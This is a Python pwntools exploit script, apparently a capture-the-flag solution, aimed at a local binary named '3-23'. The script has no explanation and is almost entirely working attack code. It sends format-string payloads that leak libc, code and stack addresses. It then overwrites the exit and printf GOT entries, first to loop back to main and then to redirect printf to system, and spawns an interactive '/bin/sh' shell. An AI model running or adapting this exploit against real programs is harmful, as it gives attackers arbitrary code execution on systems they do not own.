# -*- coding: utf-8 -*-
from pwn import *
import re 
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
printf_off=libc.symbols['printf']
system_off=libc.symbols['system']
p = process('./3-23')
context.binary='./3-23'
def send(s,maxSize=0x58):
	print len(s)
	log.info('sendline payload:0x%x::%s'%(len(s),s))
	assert(len(s)<maxSize)
	p.sendline(s)
def lv_up(addr):
	while(addr<0 or addr>=256):
		if(addr<0):
			addr=addr+256
		else:
			addr=addr-256
	return addr
#0x18
#0x1e
#gdb.attach(p)

payload="%c"*16+"%8c%hhn%6c%20$hhn@(%23$p)@@(%19$p)@@(%18$p)@"
#23for libc 
#19for code
#18for stack

send(payload)
key=p.recv()
#******************************************************
#******************************************************
#******************************************************
leak_libc,leak_code,leak_stack = re.findall(r'@[(](.*?)[)]@',key)
leak_libc = int(leak_libc,16)
leak_code = int(leak_code,16)
leak_stack = int(leak_stack,16)
#log.info('leak_libc=============================>%s',hex(leak_libc))
#log.info('leak_code============================>%s',hex(leak_code))
#log.info('leak_stack=============================>%s',hex(leak_stack))
#start calculate addr
#libc
ret_in_libc_main_start=0x7ffff7a42f2a
system_leak=0x7ffff7a63d40
printf_leak=0x7ffff7a775c0
tric=system_leak - ret_in_libc_main_start
system_addr=tric+leak_libc
base=system_addr-system_off
printf_addr=base+printf_off
#******************************************************
#log.info('base===============================>%s',hex(base))
log.info('system=============================>%s',hex(system_addr))
log.info('printf=============================>%s',hex(printf_addr))

#******************************************************
#code&date
off=leak_code-0x870+77
aim=0x2009a2+off
main=off+0x826
exit_got=main+0x20017c+0x676

#log.info('off================================>%s',hex(off))
log.info('main===============================>%s',hex(main))
log.info('exit_got===========================>%s',hex(exit_got))
#******************************************************
#******************************************************
#hijacking
main1=main&0xff
main2=main&0xff00
main2=main2 >> 8
main3=main&0xff0000
main3=main3 >> 16
system1=system_addr&0xff
system2=system_addr&0xff00
system2=system2 >> 8
system3=system_addr&0xff0000
system3=system3 >> 16
s1=system1
s3=system3-system2
s2=system2-system1
m3=main3-main2
m2=main2-main1
m1=lv_up(main1);
m2=lv_up(m2);
m3=lv_up(m3);
s2=lv_up(s2);
s3=lv_up(s3);
log.info('m1===============================>%s',hex(m1))
log.info('m2===============================>%s',hex(m2))
log.info('m3===============================>%s',hex(m3))
log.info('s1===============================>%s',hex(s1))
log.info('s2===============================>%s',hex(s2))
log.info('s3===============================>%s',hex(s3))
################################################
payload="%{}c%{}$hhn%{}c%{}$hhn%{}c%{}$hhn%".format(m1,11,m2,12,m3,13).ljust(0x28,'Y')+p64(exit_got)+p64(exit_got+1)+p64(exit_got+2)
#raw_input("die")
send(payload)
p.recv();
printf_got=0x10+0x20099a-0x2009a2+exit_got;
log.info('printf_got===============================>%s',hex(printf_got))
payload3="%{}c%{}$hhn%{}c%{}$hhn%{}c%{}$hhn%".format(s1,11,s2,12,s3,13).ljust(0x28,'Y')+p64(printf_got)+p64(printf_got+1)+p64(printf_got+2)
send(payload3)
p.recv();
p.sendline("/bin/sh\0")
p.interactive();

